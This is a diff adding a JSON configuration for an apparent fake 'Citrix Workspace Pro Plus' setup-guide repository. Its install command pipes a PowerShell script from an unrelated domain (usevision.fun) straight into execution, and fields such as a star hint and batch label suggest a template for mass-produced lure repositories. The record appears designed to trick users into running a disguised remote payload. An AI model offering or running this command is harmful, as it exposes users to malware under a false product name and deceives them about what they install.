@@ -1,0 +1,12 @@
+{
+  "repo": "Citrix-Workspace-Pro-Windows-Setup-Guide",
+  "product": "Citrix Workspace Pro Plus",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 8,
+  "batch": "new28",
+  "format": "troubleshooting-guide",
+  "category": "utility-software"
+}
